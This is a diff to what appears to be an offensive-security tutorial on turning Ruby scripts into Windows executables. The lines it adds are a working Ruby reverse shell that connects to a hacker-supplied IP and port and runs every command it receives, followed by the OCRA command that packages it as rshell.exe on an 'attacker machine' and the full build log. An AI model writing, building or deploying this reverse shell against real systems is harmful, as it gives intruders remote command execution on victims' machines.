@@ -25,8 +25,58 @@ So all what to need is to have your application.
 
 Suppose we have the following script
 ```ruby
+#!/usr/bin/env ruby
+# KING SABRI | @KINGSABRI
+require 'socket'
+if ARGV[0].nil? || ARGV[1].nil?
+    puts "ruby #{__FILE__}.rb [HACKER_IP HACKER_PORT]\n\n"
+    exit
+end
+ip, port = ARGV
+s = TCPSocket.new(ip,port)
+while cmd = s.gets
+  IO.popen(cmd,"r"){|io|s.print io.read}
+end
+```
+
+from our Windows Attacker machine cmd.exe
+```
+C:\Users\admin\Desktop>ocra rshell.rb --windows --console
+```
+
+Results 
 
 ```
+C:\Users\admin\Desktop>ocra rshell.rb --windows --console
+=== Loading script to check dependencies
+ruby C:/Users/admin/Desktop/rshell.rb.rb [HACKER_IP HACKER_PORT]
+
+=== Attempting to trigger autoload of Gem::ConfigFile
+=== Attempting to trigger autoload of Gem::DependencyList
+=== Attempting to trigger autoload of Gem::DependencyResolver
+=== Attempting to trigger autoload of Gem::Installer
+=== Attempting to trigger autoload of Gem::RequestSet
+=== Attempting to trigger autoload of Gem::Source
+=== Attempting to trigger autoload of Gem::SourceList
+=== Attempting to trigger autoload of Gem::SpecFetcher
+=== Attempting to trigger autoload of CGI::HtmlExtension
+=== Detected gem ocra-1.3.5 (loaded, files)
+===     6 files, 191333 bytes
+=== Detected gem io-console-0.4.3 (loaded, files)
+=== WARNING: Gem io-console-0.4.3 root folder was not found, skipping
+=== Including 53 encoding support files (3424768 bytes, use --no-enc to exclude)
+=== Building rshell.exe
+=== Adding user-supplied source files
+=== Adding ruby executable ruby.exe
+=== Adding detected DLL C:/Ruby22/bin/zlib1.dll
+=== Adding detected DLL C:/Ruby22/bin/LIBEAY32.dll
+=== Adding detected DLL C:/Ruby22/bin/SSLEAY32.dll
+=== Adding detected DLL C:/Ruby22/bin/libffi-6.dll
+=== Adding library files
+=== Compressing 10622666 bytes
+=== Finished building rshell.exe (2756229 bytes)
+```
+
 
 
 ### Traveling-ruby
